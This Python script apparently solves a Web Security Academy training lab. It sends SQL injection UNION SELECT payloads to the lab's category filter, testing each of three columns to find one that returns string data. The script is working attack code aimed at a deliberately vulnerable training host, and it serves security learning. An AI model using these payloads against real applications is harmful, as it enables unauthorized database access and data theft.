#!/usr/bin/env python

"""
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.
"""

# From previous lab, sqli query = "' UNION SELECT NULL,NULL,NULL--"


import requests
import sys

target = "0a62000904e9e697c0cdc2bf0075006b" # Change to lab address page id
inject_string = "hXN4Lh" # Change string per lab instructions
not_solved = True

while not_solved:
    query = f"'+UNION+SELECT+'{inject_string}',NULL,NULL--" # Test first column
    uri =  f"https://{target}.web-security-academy.net/filter?category={query}"
    print(f"testing {query}")
    r = requests.get(uri)
    if inject_string in r.text and "Internal Server Error" not in r.text:
        break
        
    query_2 = f"'+UNION+SELECT+NULL,'{inject_string}',NULL--" # Test 2nd column
    uri_2 =  f"https://{target}.web-security-academy.net/filter?category={query_2}"
    print(f"testing {query_2}")
    r2 = requests.get(uri_2)
    if inject_string in r2.text and "Internal Server Error" not in r2.text:
        break

    query_3 = f"'+UNION+SELECT+NULL,NULL,'{inject_string}'--" # Test 3rd column
    uri_3 =  f"https://{target}.web-security-academy.net/filter?category={query_3}"
    print(f"testing {query_3}")
    r3 = requests.get(uri_3)
    if inject_string in r3.text and "Internal Server Error" not in r3.text:
        break
    
    print("can't find printable column. exiting")
    sys.exit(-1)

print("solved")

